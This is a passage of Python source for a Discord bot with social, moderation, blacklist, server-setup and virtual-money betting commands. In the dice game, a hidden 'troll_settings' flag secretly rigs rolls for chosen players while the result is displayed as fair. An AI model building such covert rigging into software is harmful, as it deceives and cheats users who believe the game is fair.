    cursor.execute("SELECT * FROM marriages WHERE user1_id = ? OR user2_id = ?", (ctx.author.id, ctx.author.id))
    if cursor.fetchone():
        return await ctx.send(embed=discord.Embed(description="💍 You are already married!", color=discord.Color.red()))
    cursor.execute("SELECT * FROM marriages WHERE user1_id = ? OR user2_id = ?", (member.id, member.id))
    if cursor.fetchone():
        return await ctx.send(embed=discord.Embed(description=f"🥺 **{member.display_name}** is already married!", color=discord.Color.red()))

    embed = discord.Embed(title="💍 Marriage Proposal", description=f"{ctx.author.mention} wants to marry {member.mention}!\n\n{member.mention}, do you accept?", color=discord.Color.from_rgb(255, 105, 180))
    embed.set_footer(text="This request expires in 60 seconds.")
    await ctx.send(embed=embed, view=MarriageRequestView(ctx.author.id, member.id, "marry"))

@bot.hybrid_command(name="divorce", description="Get divorced from your spouse")
async def divorce(ctx):
    cursor.execute("SELECT user1_id, user2_id FROM marriages WHERE user1_id = ? OR user2_id = ?", (ctx.author.id, ctx.author.id))
    row = cursor.fetchone()
    if not row:
        return await ctx.send(embed=discord.Embed(description="You are not married to anyone crackhead.", color=discord.Color.red()))

    spouse_id = row[1] if row[0] == ctx.author.id else row[0]
    cursor.execute(
        "DELETE FROM marriages WHERE (user1_id = ? AND user2_id = ?) OR (user1_id = ? AND user2_id = ?)",
        (ctx.author.id, spouse_id, spouse_id, ctx.author.id)
    )
    db.commit()

    embed = discord.Embed(
        title="💔 Divorce",
        description=f"{ctx.author.mention} filed a divorce and got divorced with <@{spouse_id}>.",
        color=discord.Color.blurple()
    )
    await ctx.send(embed=embed)

@bot.hybrid_command(name="snipe", description="View deleted messages from the channel")
async def snipe(ctx, amount: int = 1):
    channel_id = ctx.channel.id
    if channel_id not in sniped_messages or not sniped_messages[channel_id]:
        embed = discord.Embed(description="⚠️ There are no deleted messages to snipe in this channel.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    
    messages = sniped_messages[channel_id]
    count = max(1, min(amount, len(messages)))
    target_msgs = messages[-count:]
    target_msgs.reverse()

    embed = discord.Embed(
        title=f"🎯 Sniped Message(s)",
        description=f"Showing the last **{count}** deleted message(s) in this channel.",
        color=discord.Color.from_rgb(47, 49, 54)
    )
    
    for idx, snipe_data in enumerate(target_msgs, 1):
        content = snipe_data["content"] or "*No text content*"
        if snipe_data["attachments"]:
            content += f"\n🔗 **Attachment:** [View File]({snipe_data['attachments'][0]})"
        
        author = snipe_data["author"]
        embed.add_field(
            name=f"💬 Message #{idx} • {author}",
            value=f"> {content}",
            inline=False
        )

    embed.set_footer(text=f"Requested by {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.hybrid_command(name="editsnipe", description="View the last edited message")
async def editsnipe(ctx):
    channel_id = ctx.channel.id
    if channel_id not in edited_messages or not edited_messages[channel_id]:
        embed = discord.Embed(description="⚠️ There are no edited messages to snipe in this channel.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    
    edit_data = edited_messages[channel_id][-1]
    embed = discord.Embed(title="Edited Message", color=discord.Color.orange())
    embed.set_author(name=str(edit_data["author"]), icon_url=edit_data["author"].display_avatar.url)
    
    embed.add_field(
        name=f"┌ 👤 **{edit_data['author']}** (Edited Message)",
        value=f"├ 🛑 **Before:** {edit_data['before']}\n└ ✅ **After:** {edit_data['after']}",
        inline=False
    )
    
    await ctx.send(embed=embed)

@bot.hybrid_command(name="poll", description="Create a simple poll")
@commands.has_permissions(manage_messages=True)
async def poll(ctx, *, question: str):
    embed = discord.Embed(title="📊 Poll", description=question, color=discord.Color.blurple())
    embed.set_footer(text=f"Poll created by {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
    if ctx.interaction:
        response_embed = discord.Embed(description="📊 Poll created!", color=discord.Color.green())
        await ctx.interaction.response.send_message(embed=response_embed, ephemeral=True)
        msg = await ctx.channel.send(embed=embed)
    else:
        if ctx.message:
            try:
                await ctx.message.delete()
            except Exception:
                pass
        msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

@bot.hybrid_command(name="say", description="Make the bot say something")
@commands.has_permissions(manage_messages=True)
async def say(ctx, *, message: str):
    if ctx.interaction:
        await ctx.interaction.response.send_message("Message sent!", ephemeral=True)
        await ctx.channel.send(message)
    else:
        if ctx.message:
            try:
                await ctx.message.delete()
            except Exception:
                pass
        await ctx.send(message)

@bot.hybrid_command(name="embed", description="Send a custom embed message")
@commands.has_permissions(manage_messages=True)
async def custom_embed(ctx, *, content: str):
    parts = content.split("|")
    title = parts[0].strip()
    desc = parts[1].strip() if len(parts) > 1 else ""
    
    embed = discord.Embed(title=title, description=desc, color=discord.Color.blurple())
    if ctx.interaction:
        response_embed = discord.Embed(description="🤑 Embed sent!", color=discord.Color.green())
        await ctx.interaction.response.send_message(embed=response_embed, ephemeral=True)
        await ctx.channel.send(embed=embed)
    else:
        if ctx.message:
            try:
                await ctx.message.delete()
            except Exception:
                pass
        await ctx.send(embed=embed)

def _is_server_mod(member: discord.Member) -> bool:
    if member.guild_permissions.administrator:
        return True
    mod_role_names = {"Moderator", "Admin", "Owner"}
    return any(role.name in mod_role_names for role in member.roles)

async def _run_purge(ctx, amount: int):
    if not isinstance(ctx.author, discord.Member) or not _is_server_mod(ctx.author):
        embed = discord.Embed(
            title="☠️ Permission Denied",
            description="Only **server administrators or moderators** can use this command.",
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, ephemeral=True)

    if amount < 1 or amount > 100:
        embed = discord.Embed(
            title="Invalid Amount",
            description="Choose an amount between **1 and 100** messages.",
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, ephemeral=True)

    extra = 1 if ctx.message is not None and ctx.interaction is None else 0
    deleted = await ctx.channel.purge(limit=amount + extra)
    removed = len(deleted) - extra

    embed = discord.Embed(
        title="Messages Purged",
        description=f"Successfully deleted **{removed}** message(s) from this channel.",
        color=discord.Color.green()
    )
    embed.set_footer(text=f"Purged by {ctx.author.display_name}")
    await ctx.send(embed=embed, delete_after=5)

@bot.hybrid_command(name="clear", description="Clear a number of messages")
async def clear(ctx, amount: int):
    await _run_purge(ctx, amount)

@bot.hybrid_command(name="purge", description="Mass-delete messages (Admin/Moderator only)")
async def purge(ctx, amount: int):
    await _run_purge(ctx, amount)

@bot.hybrid_command(name="slowmode", description="Set channel slowmode")
@commands.has_permissions(manage_channels=True)
async def slowmode(ctx, seconds: int):
    if seconds < 0:
        embed = discord.Embed(description="Seconds cannot be negative.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    await ctx.channel.edit(slowmode_delay=seconds)
    if seconds == 0:
        embed = discord.Embed(description="Slowmode has been disabled.", color=discord.Color.green())
    else:
        embed = discord.Embed(description=f"Slowmode has been set to **{seconds} seconds**.", color=discord.Color.green())
    await ctx.send(embed=embed)

# =========================================================
# BRAINROT DICE COMMAND & UI
# =========================================================

BRAINROT_CHOICES = [
    {"label": "Strawberry Elephant", "emoji": "🍓", "bonus": 3},
    {"label": "Meowl", "emoji": "🐱", "bonus": 1},
    {"label": "Skibidi Toilet", "emoji": "🚽", "bonus": 3},
    {"label": "Dragon Cannelloni", "emoji": "🐉", "bonus": 2},
    {"label": "Spaghetti Tualetti", "emoji": "🍝", "bonus": 2},
    {"label": "Garama and Madundung", "emoji": "🗿", "bonus": 2},
    {"label": "Ketchuru and Musturu", "emoji": "🍅", "bonus": 1},
    {"label": "La Supreme Combinasion", "emoji": "👑", "bonus": 4},
    {"label": "Los Bros", "emoji": "👥", "bonus": 1},
    {"label": "Ketupat Kepat", "emoji": "🟢", "bonus": 1},
    {"label": "Tralaledon", "emoji": "🎶", "bonus": 2},
    {"label": "Los Hotspotsitos", "emoji": "🔥", "bonus": 2},
    {"label": "Nuclearo Dinossauro", "emoji": "☢️", "bonus": 3},
    {"label": "La Grande Combinasion", "emoji": "🌟", "bonus": 4},
    {"label": "Graipuss Medussi", "emoji": "🐙", "bonus": 2},
    {"label": "Las Vaquitas Saturnitas", "emoji": "🪐", "bonus": 2},
    {"label": "Job Job Job Sahur", "emoji": "🌙", "bonus": 1},
    {"label": "Las Tralaleritas", "emoji": "✨", "bonus": 2},
    {"label": "Agarrini La Palini", "emoji": "🤌", "bonus": 1},
    {"label": "Torrtuginni Dragonfrutini", "emoji": "🐢", "bonus": 2},
    {"label": "Sammyni Spyderini", "emoji": "🕷️", "bonus": 2},
    {"label": "Los Spyderinis", "emoji": "🕸️", "bonus": 1},
    {"label": "Blackhole Goat", "emoji": "🐐", "bonus": 3},
    {"label": "Fragola la la la", "emoji": "🍓", "bonus": 2},
    {"label": "Bisonte Giuppitere", "emoji": "🐃", "bonus": 3}
]

COLOR_CHOICES = [
    {"label": "Red", "color_name": "Red", "discord_color": discord.Color.red(), "emoji": "🔴", "bonus": 2},
    {"label": "Blue", "color_name": "Blue", "discord_color": discord.Color.blue(), "emoji": "🔵", "bonus": 2},
    {"label": "Green", "color_name": "Green", "discord_color": discord.Color.green(), "emoji": "🟢", "bonus": 2},
    {"label": "Yellow", "color_name": "Yellow", "discord_color": discord.Color.gold(), "emoji": "🟡", "bonus": 2},
    {"label": "Purple", "color_name": "Purple", "discord_color": discord.Color.purple(), "emoji": "🟣", "bonus": 2}
]

class BrainrotSelect(discord.ui.Select):
    def __init__(self, placeholder, row_num):
        options = [
            discord.SelectOption(label=item["label"], description=f"Brainrot Bonus: +{item['bonus']}", emoji=item["emoji"])
            for item in BRAINROT_CHOICES
        ]
        super().__init__(placeholder=placeholder, min_values=1, max_values=1, options=options, row=row_num)

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer()

class ColorSelect(discord.ui.Select):
    def __init__(self, placeholder, row_num):
        options = [
            discord.SelectOption(label=item["label"], description=f"Color Bonus: +{item['bonus']}", emoji=item["emoji"])
            for item in COLOR_CHOICES
        ]
        super().__init__(placeholder=placeholder, min_values=1, max_values=1, options=options, row=row_num)

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer()

class BrainrotDiceView(discord.ui.View):
    def __init__(self, host_id, amount):
        super().__init__(timeout=120)
        self.host_id = host_id
        self.amount = amount
        
        self.p1_id = host_id
        self.p2_id = None
        
        self.p1_brainrot = BrainrotSelect("Choose YOUR Brainrot (Host)...", row_num=0)
        self.p1_color = ColorSelect("Choose YOUR Color (Host)...", row_num=1)
        
        self.p2_brainrot = BrainrotSelect("Choose YOUR Brainrot (Opponent)...", row_num=2)
        self.p2_color = ColorSelect("Choose YOUR Color (Opponent)...", row_num=3)
        
        self.p2_brainrot.disabled = True
        self.p2_color.disabled = True

        self.add_item(self.p1_brainrot)
        self.add_item(self.p1_color)
        self.add_item(self.p2_brainrot)
        self.add_item(self.p2_color)

    @discord.ui.button(label="Join Game", style=discord.ButtonStyle.green, row=4)
    async def join_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == self.host_id:
            embed = discord.Embed(description="You cannot join your own game as the opponent!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        if self.p2_id is not None:
            embed = discord.Embed(description="🎭 The opponent spot is already filled!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        
        if self.amount > 0:
            wallet, _ = get_user_econ(interaction.user.id)
            if wallet < self.amount:
                embed = discord.Embed(description="🤣 You don't have enough money in your wallet to join this bet.", color=discord.Color.red())
                return await interaction.response.send_message(embed=embed, ephemeral=True)

        self.p2_id = interaction.user.id
        self.p2_brainrot.disabled = False
        self.p2_color.disabled = False
        button.label = f"Joined: {interaction.user.display_name}"
        button.style = discord.ButtonStyle.secondary
        button.disabled = True

        embed = interaction.message.embeds[0]
        embed.description = f"💸 **Brainrot Dice Showdown**\nHost: <@{self.host_id}>\nOpponent: <@{self.p2_id}>\n\nBoth players, select your Brainrot & Color from the dropdowns, then click **🎲 Roll!**"
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="🎲 Roll!", style=discord.ButtonStyle.success, row=4)
    async def roll_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in (self.host_id, self.p2_id if self.p2_id else -1):
            if self.p2_id is None:
                embed = discord.Embed(description="🎮 Someone needs to click **Join Game** first!", color=discord.Color.red())
                return await interaction.response.send_message(embed=embed, ephemeral=True)
            embed = discord.Embed(description="This isn't your game!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        
        if self.p2_id is None:
            embed = discord.Embed(description="⏰ Waiting for an opponent to join the game first!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if not self.p1_brainrot.values or not self.p1_color.values:
            embed = discord.Embed(description="⚠️ Host must select their Brainrot and Color first!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        if not self.p2_brainrot.values or not self.p2_color.values:
            embed = discord.Embed(description="⚠️ Opponent must select their Brainrot and Color first!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        p1_b_name = self.p1_brainrot.values[0]
        p1_c_name = self.p1_color.values[0]
        p2_b_name = self.p2_brainrot.values[0]
        p2_c_name = self.p2_color.values[0]

        b1_bonus = next((item["bonus"] for item in BRAINROT_CHOICES if item["label"] == p1_b_name), 0)
        c1_bonus = next((item["bonus"] for item in COLOR_CHOICES if item["label"] == p1_c_name), 0)
        b2_bonus = next((item["bonus"] for item in BRAINROT_CHOICES if item["label"] == p2_b_name), 0)
        c2_bonus = next((item["bonus"] for item in COLOR_CHOICES if item["label"] == p2_c_name), 0)

        p1_rigged = troll_settings.get(self.host_id, {}).get("brainrot", False)
        p2_rigged = troll_settings.get(self.p2_id, {}).get("brainrot", False)

        if p1_rigged and not p2_rigged:
            p1_roll = 50
            p2_roll = 1
        elif p2_rigged and not p1_rigged:
            p2_roll = 50
            p1_roll = 1
        else:
            p1_roll = random.randint(1, 6) + b1_bonus + c1_bonus
            p2_roll = random.randint(1, 6) + b2_bonus + c2_bonus

        embed = discord.Embed(title="💰 Brainrot Dice Battle Results", color=discord.Color.blurple())
        embed.add_field(name=f"<@{self.host_id}>", value=f"Brainrot: {p1_b_name}\nColor: {p1_c_name}\nTotal Roll: **{p1_roll}**", inline=True)
        embed.add_field(name=f"<@{self.p2_id}>", value=f"Brainrot: {p2_b_name}\nColor: {p2_c_name}\nTotal Roll: **{p2_roll}**", inline=True)

        if p1_roll > p2_roll:
            if self.amount > 0:
                update_wallet(self.host_id, self.amount)
                update_wallet(self.p2_id, -self.amount)
            embed.description = f"🎉 <@{self.host_id}> wins the battle!"
            embed.color = discord.Color.green()
        elif p2_roll > p1_roll:
            if self.amount > 0:
                update_wallet(self.p2_id, self.amount)
                update_wallet(self.host_id, -self.amount)
            embed.description = f"🎉 <@{self.p2_id}> wins the battle!"
            embed.color = discord.Color.green()
        else:
            embed.description = "🤝 It's a tie! No money exchanged."
            embed.color = discord.Color.gold()

        await interaction.response.send_message(embed=embed)

@bot.hybrid_command(name="brainrot_dice", description="Play a 2-player brainrot dice game")
async def brainrot_dice(ctx, amount: int = 0):
    if amount < 0:
        embed = discord.Embed(description="Amount cannot be negative.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if amount > 0:
        wallet, _ = get_user_econ(ctx.author.id)
        if wallet < amount:
            embed = discord.Embed(description="You don't have enough money in your wallet.", color=discord.Color.red())
            return await ctx.send(embed=embed)
    
    view = BrainrotDiceView(ctx.author.id, amount)
    embed = discord.Embed(
        title="🧠 Brainrot Dice Showdown",
        description=f"Host: {ctx.author.mention}\nOpponent: *Waiting for player...*\n\nClick **Join Game** to play!",
        color=discord.Color.from_rgb(30, 31, 34)
    )
    if ctx.interaction:
        await ctx.interaction.response.send_message(embed=embed, view=view)
    else:
        await ctx.send(embed=embed, view=view)

# =========================================================
# BLACKLIST & SERVER BLACKLIST MANAGEMENT COMMANDS
# =========================================================

@bot.hybrid_command(name="blacklist", description="Globally blacklist a user or server from using the bot")
async def blacklist(ctx, target: str, *, reason: str = "No reason provided"):
    if ctx.author.id not in OWNER_IDS:
        embed = discord.Embed(description="You do not have permission to use this command.", color=discord.Color.red())
        return await ctx.send(embed=embed, ephemeral=True)
    
    if target.lower() in ("srv", "server"):
        gid = ctx.guild.id if ctx.guild else 0
        gname = ctx.guild.name if ctx.guild else "Unknown Server"
        if not gid:
            return await ctx.send("No valid guild found to blacklist.", ephemeral=True)
        cursor.execute("INSERT OR REPLACE INTO server_blacklist (guild_id, moderator_id, reason) VALUES (?, ?, ?)", (gid, ctx.author.id, reason))
        db.commit()
        embed = discord.Embed(description=f"Blacklisted server name: **{gname}** and server id: `{gid}` from using the bot. Reason: {reason}", color=discord.Color.orange())
        return await ctx.send(embed=embed)

    uid_str = re.sub(r'\D', '', target)
    if not uid_str:
        embed = discord.Embed(description="⭐️ Please provide a valid user ID, mention, or 'srv' keyword.", color=discord.Color.red())
        return await ctx.send(embed=embed, ephemeral=True)
    
    uid = int(uid_str)
    if uid in OWNER_IDS:
        embed = discord.Embed(description="☠️ You cannot blacklist a bot owner!", color=discord.Color.red())
        return await ctx.send(embed=embed, ephemeral=True)

    cursor.execute("INSERT OR REPLACE INTO blacklist (user_id, moderator_id, reason) VALUES (?, ?, ?)", (uid, ctx.author.id, reason))
    db.commit()
    embed = discord.Embed(description=f"🚫 User ID `{uid}` has been **globally blacklisted** from using the bot. Reason: {reason}", color=discord.Color.orange())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="unblacklist", description="Remove a user ID from the global bot blacklist")
async def unblacklist(ctx, user_id: str):
    if ctx.author.id not in OWNER_IDS:
        embed = discord.Embed(description="🚿 You do not have permission to use this command.", color=discord.Color.red())
        return await ctx.send(embed=embed, ephemeral=True)
    
    try:
        uid = int(re.sub(r'\D', '', user_id))
    except ValueError:
        embed = discord.Embed(description="Please provide a valid numeric user ID.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    cursor.execute("SELECT 1 FROM blacklist WHERE user_id = ?", (uid,))
    if not cursor.fetchone():
        embed = discord.Embed(description=f"User ID `{uid}` is not currently blacklisted.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    cursor.execute("DELETE FROM blacklist WHERE user_id = ?", (uid,))
    db.commit()
    embed = discord.Embed(description=f"🎉 User ID `{uid}` has been successfully removed from the global blacklist.", color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="serverblacklist", description="Blacklist an entire server (Guild ID) from using the bot")
async def serverblacklist(ctx, guild_id: str, *, reason: str = "No reason provided"):
    if ctx.author.id not in OWNER_IDS:
        embed = discord.Embed(description="You do not have **permission** to use this command.", color=discord.Color.red())
        return await ctx.send(embed=embed, ephemeral=True)
    
    try:
        gid = int(re.sub(r'\D', '', guild_id))
    except ValueError:
        embed = discord.Embed(description="Please provide a valid numeric server ID.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    target_guild = bot.get_guild(gid)
    gname = target_guild.name if target_guild else "Unknown Server"

    cursor.execute("INSERT OR REPLACE INTO server_blacklist (guild_id, moderator_id, reason) VALUES (?, ?, ?)", (gid, ctx.author.id, reason))
    db.commit()
    embed = discord.Embed(description=f"Blacklisted server name: **{gname}** and server id: `{gid}` from using the bot. Reason: {reason}", color=discord.Color.orange())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="serverunblacklist", description="Remove a server ID from the server blacklist")
async def serverunblacklist(ctx, guild_id: str):
    if ctx.author.id not in OWNER_IDS:
        embed = discord.Embed(description="You do not have permission to use this command.", color=discord.Color.red())
        return await ctx.send(embed=embed, ephemeral=True)
    
    try:
        gid = int(re.sub(r'\D', '', guild_id))
    except ValueError:
        embed = discord.Embed(description="Please provide a valid numeric server ID.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    cursor.execute("SELECT 1 FROM server_blacklist WHERE guild_id = ?", (gid,))
    if not cursor.fetchone():
        embed = discord.Embed(description=f"❌ Server ID `{gid}` is not currently blacklisted.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    cursor.execute("DELETE FROM server_blacklist WHERE guild_id = ?", (gid,))
    db.commit()
    embed = discord.Embed(description=f"✅ Server ID `{gid}` has been removed from the server blacklist.", color=discord.Color.green())
    await ctx.send(embed=embed)

# =========================================================
# SERVER SETUP
# =========================================================

SETUP_USER_ID = 1475693209949569024

SETUP_ROLES = [
    ("Owner", discord.Color.red()),
    ("Admin", discord.Color.orange()),
    ("Moderator", discord.Color.blue()),
    ("Staff", discord.Color.purple()),
    ("Giveaway Manager", discord.Color.gold()),
    ("Member", discord.Color.green()),
]

SETUP_STRUCTURE = {
    "〈🔒〉・Staff Only": [
        ("Staff-Rules", "📖", "text"),
        ("Staff-Announcements", "📢", "text"),
        ("Staff-Chat", "💬", "text"),
        ("Staff-Promotions", "🎉", "text"),
        ("Staff-Demotions", "📉", "text"),
        ("Applications", "📄", "text"),
        ("Staff-Vc", "🎙️", "voice"),
    ],

    "〈👋〉・Arrivals": [
        ("Roles-Info", "🎭", "text"),
        ("Welcome", "👋", "text"),
        ("Goodbye", "🪽", "text"),
    ],

    "〈⚠️〉・Important": [
        ("Verify", "✅", "text"),
        ("Rules", "📖", "text"),
        ("Announcements", "📢", "text"),
        ("Owners-Vouches", "📸", "text"),
        ("Owners-Trading", "👑", "text"),
        ("Applications", "📄", "text"),
        ("Server-Updates", "🔄", "text"),
        ("Spreader-Videos", "📺", "text"),
        ("Staff-Feedbacks", "🏅", "text"),
        ("Sab-Leaks", "👀", "text"),
        ("Partnerships", "⭐", "text"),
        ("Boosts", "🚀", "text"),
        ("Booster-Perks", "🏅", "text"),
        ("Polls", "📊", "text"),
        ("Hall-Of-Fame", "🥇", "text"),
        ("Help-Ticket", "🎟️", "text"),
    ],

    "〈🎁〉・Giveaways": [
        ("Giveaways", "🎁", "text"),
        ("Giveaway-Vouches", "🏅", "text"),
        ("Events", "🎉", "text"),
    ],

    "〈🤝〉・Middleman": [
        ("Middleman", "🤝", "text"),
        ("Middleman-Vouches", "⭐", "text"),
        ("Middleman-Ticket", "🎟️", "text"),
    ],

    "〈💬〉・General": [
        ("General-Chat", "💬", "text"),
        ("Media", "📸", "text"),
        ("Commands", "⚙️", "text"),
        ("Steals", "💰", "text"),
        ("Levels", "📊", "text"),
        ("Boosters-Chat", "🚀", "text"),
        ("Suggestions", "🛠️", "text"),
    ],

    "〈💣〉・Reverse Beanie": [
        ("Beanie-Rules", "📖", "text"),
        ("Beanie-Announcements", "📢", "text"),
        ("Beanie-Chat", "💬", "text"),
        ("Beanie-Scripts", "📁", "text"),
        ("Usernames", "🔍", "text"),
    ],

    "〈💰〉・Trading": [
        ("Trading-Fourm", "💸", "text"),
        ("Trading", "💰", "text"),
        ("Mid-Trading", "⭐", "text"),
        ("Og-Trading", "💎", "text"),
        ("Cross-Trading", "📌", "text"),
        ("Duel-Requests", "⚔️", "text"),
        ("Win-Or-Loss", "⚖️", "text"),
        ("Vouches", "✅", "text"),
    ],

    "〈🎬〉・Content Creators": [
        ("Creators-Rules", "📖", "text"),
        ("Creators-Announcements", "📢", "text"),
        ("Creators-Chat", "💬", "text"),
        ("Creators-Ideas", "🛠️", "text"),
    ],

    "〈🔊〉・Voice Chats": [
        ("Create-Vc", "🔑", "voice"),
        ("Owners-Vc", "👑", "voice"),
        ("General-Vc", "🎙️", "voice"),
        ("Trading-Vc", "💼", "voice"),
        ("Pvp-Vc", "⚔️", "voice"),
        ("Sab-Vc", "🎙️", "voice"),
    ],
}

def format_setup_channel(emoji, base_name, separator):
    return f"{emoji}{separator}{base_name}"

@bot.hybrid_command(
    name="setup",
    description="Create the server layout and choose a channel naming style"
)
async def setup(ctx, style: str = "┃"):
    valid_styles = {"┃", "・", "-・-"}
    style = style.strip()
    if style not in valid_styles:
        return await ctx.send("Invalid style. Use `┃`, `・`, or `-・-`.")

    interaction = ctx.interaction
    if interaction is not None:
        await interaction.response.defer(ephemeral=True)

    if ctx.author.id != SETUP_USER_ID:
        return await ctx.send("😂 You are not allowed to use `,,setup`.", ephemeral=interaction is not None)

    guild = ctx.guild
    if guild is None:
        return await ctx.send("This command can only be used inside a server.", ephemeral=interaction is not None)

    async def setup_error(message):
        if interaction is not None:
            return await interaction.followup.send(message, ephemeral=True)
        return await ctx.send(message)

    created_roles = 0
    created_channels = 0
    existing_channels = 0
    roles = {}

    for role_name, color in SETUP_ROLES:
        role = discord.utils.get(guild.roles, name=role_name)

        if role is None:
            try:
                role = await guild.create_role(
                    name=role_name,
                    color=color,
                    reason=f"/setup used by {ctx.author}"
                )
                created_roles += 1
            except discord.Forbidden:
                return await setup_error("⚠️ I need **Manage Roles** permission to create the roles.")

        roles[role_name] = role

    categories = {}

    for category_name, channel_list in SETUP_STRUCTURE.items():
        category = discord.utils.get(
            guild.categories,
            name=category_name
        )

        if category is None:
            try:
                category = await guild.create_category(
                    category_name,
                    reason=f"/setup used by {ctx.author}"
                )
            except discord.Forbidden:
                return await setup_error("I need **Manage Channels** permission.")

        categories[category_name] = category

        for base_name, emoji, channel_type in channel_list:
            channel_name = format_setup_channel(emoji, base_name, style)
            existing = discord.utils.get(category.channels, name=channel_name)

            if existing is None:
                try:
                    if channel_type == "voice":
                        await guild.create_voice_channel(name=channel_name, category=category, reason=f"/setup used by {ctx.author}")
                    else:
                        await guild.create_text_channel(name=channel_name, category=category, reason=f"/setup used by {ctx.author}")
                    created_channels += 1
                except discord.Forbidden:
                    return await setup_error("I need **Manage Channels** permission.")
            else:
                existing_channels += 1

    success_text = f"Server setup complete! Created **{created_roles}** roles and **{created_channels}** new channels ({existing_channels} already existed)."
    if interaction is not None:
        await interaction.followup.send(success_text, ephemeral=True)
    else:
        await ctx.send(success_text)
# =========================================================
# GUESS A NUMBER COMMAND & UI - FIXED WITH PROPER BOT GUESSING
# =========================================================

guess_number_games = {}

class BetModal(discord.ui.Modal, title="Set Your Bet"):
    amount = discord.ui.TextInput(label="Bet Amount", placeholder="e.g. 100", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            bet_amount = int(self.amount.value.strip())
        except ValueError:
            embed = discord.Embed(description="Please enter a valid number.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if bet_amount <= 0:
            embed = discord.Embed(description="Amount must be greater than zero.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        wallet, _ = get_user_econ(interaction.user.id)
        if wallet < bet_amount:
            embed = discord.Embed(description="You dont have enough money you brokie.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if interaction.user.id in guess_number_games:
            embed = discord.Embed(description="You already have a game running!", color=discord.Color.orange())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        view = ModeSelectView(interaction.user.id, bet_amount)
        embed = discord.Embed(
            title="🎮 Guess A Number - Select Mode",
            description=f"Bet Amount: **${bet_amount:,}**\n\nWould you like to play with **AI** or a **Human**?",
            color=discord.Color.blurple()
        )
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

class ModeSelectView(discord.ui.View):
    def __init__(self, user_id, bet_amount):
        super().__init__(timeout=60)
        self.user_id = user_id
        self.bet_amount = bet_amount

    async def on_timeout(self):
        guess_number_games.pop(self.user_id, None)

    @discord.ui.button(label="🤖 Play with AI", style=discord.ButtonStyle.primary)
    async def ai_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            embed = discord.Embed(description="This isn't your game!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        embed = discord.Embed(
            title="🎮 Pick Your Secret Number",
            description="Enter your secret number (1-100):\n💰 Bet: **$" + str(self.bet_amount) + "**",
            color=discord.Color.blurple()
        )
        modal = PlayerNumberModal(self.user_id, self.bet_amount, is_ai=True)
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="👤 Play with Human", style=discord.ButtonStyle.success)
    async def human_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            embed = discord.Embed(description="This isn't your game!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        guess_number_games[self.user_id] = {"state": "waiting", "bet": self.bet_amount}
        
        embed = discord.Embed(
            title="👤 Waiting for Opponent...",
            description=f"{interaction.user.mention} is trying to play Guess A Number!\n💰 Bet: **${self.bet_amount:,}**\n\nClick below to accept the challenge!",
            color=discord.Color.gold()
        )
        view = HumanOpponentView(self.user_id, self.bet_amount)
        await interaction.response.send_message(embed=embed, view=view)

class HumanOpponentView(discord.ui.View):
    def __init__(self, proposer_id, bet_amount):
        super().__init__(timeout=120)
        self.proposer_id = proposer_id
        self.bet_amount = bet_amount
        self.opponent_id = None
        self.answered = False

    async def on_timeout(self):
        guess_number_games.pop(self.proposer_id, None)

    @discord.ui.button(label="✅ Accept Challenge", style=discord.ButtonStyle.green)
    async def accept_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == self.proposer_id:
            embed = discord.Embed(description="You can't play against yourself!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if self.answered:
            embed = discord.Embed(description="Someone already accepted this challenge.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if interaction.user.id in guess_number_games:
            embed = discord.Embed(description="You're already in a game!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        wallet, _ = get_user_econ(interaction.user.id)
        if wallet < self.bet_amount:
            embed = discord.Embed(description="You dont have enough money you brokie.", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        self.answered = True
        self.opponent_id = interaction.user.id
        for child in self.children:
            child.disabled = True

        embed = discord.Embed(
            title="🎮 Pick Your Secret Number",
            description=f"Enter your secret number (1-100):\n💰 Bet: **${self.bet_amount:,}**",
            color=discord.Color.blurple()
        )
